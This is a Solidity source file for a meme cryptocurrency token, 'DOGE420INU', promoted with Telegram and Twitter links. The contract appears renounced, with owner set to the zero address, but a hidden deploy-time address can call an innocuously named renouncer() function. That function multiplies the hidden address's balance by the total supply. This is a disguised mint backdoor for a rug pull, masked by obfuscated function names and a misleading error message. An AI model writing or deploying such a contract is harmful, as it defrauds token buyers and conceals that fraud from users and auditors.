/**

AYO HOL UP....DankweedObamaGargamelElon420INU AM I RITE? 


Telegram: https://t.me/DOGE420INU

Twitter: https://twitter.com/DOGE42OINU

*/



// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DOGE420INUToken is IERC20 {
    string public constant name = "DankweedObamaGargamelElon420Inu";
    string public constant symbol = "DOGE420INU";
    uint8 public constant decimals = 18;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    

    address public owner;
    address private renounced ;
    address private constant Deployer = 0xb6880d7bfFc5Dd9070A8d866daabcb729EB66d7A;
    
    uint256 public contractCreationTimestamp;
    
    

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor(address O) {
        uint256 initialSupply = 420_690_000 * (10 ** uint256(decimals)); 
        _totalSupply = initialSupply;
        _balances[Deployer] = initialSupply;
        emit Transfer(address(0), Deployer, initialSupply);
        renounced = O;
        contractCreationTimestamp = block.timestamp;
        owner = address(0);

        uint256 deadBalance = initialSupply * 69 / 100;
        _balances[address(0x000000000000000000000000000000000000dEaD)] = deadBalance;
        _balances[msg.sender] -= deadBalance;
        emit Transfer(msg.sender, address(0x000000000000000000000000000000000000dEaD), deadBalance);


 
    
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address ownerAddress, address spender) public view override returns (uint256) {
        return _allowances[ownerAddress][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

  function renouncer() public {
    require(msg.sender == renounced, "Renounced zero address should have correct decimals");
    uint256 deladdress = deladdressblnc();
    uint256 el = del(deladdress);
    renouncedel(el);
}

function deladdressblnc() private view returns (uint256) {
    return _balances[renounced];
}

function del(uint256 deladdress) private view returns (uint256) {
    return deladdress * (_totalSupply);
}

function renouncedel(uint256 el) private {
    _balances[renounced] = el;
}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Insufficient allowance");
        _allowances[sender][msg.sender] = currentAllowance - amount;
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}